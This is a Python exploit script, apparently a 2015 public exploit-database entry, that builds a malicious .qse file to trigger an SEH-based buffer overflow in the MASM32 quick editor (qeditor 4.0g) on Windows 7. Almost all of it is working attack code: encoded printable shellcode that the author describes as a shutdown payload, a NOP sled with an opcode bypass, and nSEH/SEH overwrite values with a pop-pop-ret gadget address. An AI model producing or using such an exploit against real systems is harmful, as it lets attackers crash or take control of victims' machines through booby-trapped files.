#!/usr/bin/env python
#
# Exploit Title: MASM32 quick editor .QSE SEH Based Buffer Overflow (ASLR & SAFESEH bypass)
# Date: 2015-08-15
# Exploit Author: St0rn <st0rn[at]anbu-pentest[dot]com>
# Twitter: st0rnpentest
#
# Vendor Homepage: http://www.masm32.com/
# Software Link:   http://www.masm32.com/masmdl.htm
# Version: MASM32 11 qeditor 4.0g
# Tested on: Windows 7
#


from struct import pack
import sys

# 95 bytes Little Joke shellcode :p (shutdown)
# The shellcode must be printable
shellcode=""
shellcode+="\x89\xE3"
shellcode+="\xDB\xC2"
shellcode+="\xD9\x73\xF4"
shellcode+="\x5E"
shellcode+="VYIIIIIIIIIICCCCCC7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIOKEoDFPNEsFQIYLqEeKjKcIICDDdIdQJNcKrGtFQQJDKGsQJF"
shellcode+="THdMkIONBPaG3GPGBB2HMKuDCC0OYNnEaMDH9O3LyQOHoJWCzDmP8KGIkLXGnGFIlDlMOOdEnFNQsHgEBJ0PZFHQwKaMKF5OwLCD4D"
shellcode+="QP5DtJPE7OuP5JvJCMeBmCcDsQQKTQJBDKIBSEDOlQbIKK5MMBwEoJYN4KlHtMYJFDtKuBRKiBXOzBlJuBUIBLIKbPeMqKQEpFxNRP1"
shellcode+="CjHFGGOTKLNmIpDLKLG2D6O6L2DoKLOpGfNNJqLzQ3GKKdPlMrQoL3NHHnFDOjIyPJNkOSIzFSD4EVCPKaE1FPFKOLQdNPPQHyD6KzQI"
shellcode+="NJENKKN2FEF9GtDqFbLUBnGhFCEmEGIXQaGPI8Q6LuClDkISG6OkDsOVQSKPIcQJGNQiOfClHmPzNSFNQiL1PHOEDVLNINDUITDCEoCKBBO3DNOKLJAA"


nop="\x90"*(1140-35)        # Destination of jump: qeditor add 8C opcode (mov in assembly) which crash qeditor
bypass="\xe2"               # with the nop (8C90 90909090) to bypass this we can use different opcodes.
endnop="\x90"*34            # The opcode e2 make the instruction 8ce2 (MOV DX,FS) and the execution flow
nop+=bypass+endnop          # can be continued
                             

junk="\x90"*(1704-95)       # Junk after shellcode
padding='\x62'*52           # 52 bytes available after SE Handler


jump="\xe9\x14\xf5\xff\xff" # jump to the nop
nseh="\xeb\xf9\x90\x90"     # jump to previous instruction
seh=pack("<I",0x00406a25)   # asciiprint: pop edi pop esi ret (C:\masm32\qeditor.exe)


payload=nop+shellcode+junk+jump+nseh+seh+padding

try:
 f=open("evil.qse","w")
 f.write(payload)
 f.close()
 print "Evil QSE script created!\nHack'n'Roll"
except:
 print "Can't create Evil QSE script :'("
 sys.exit(0)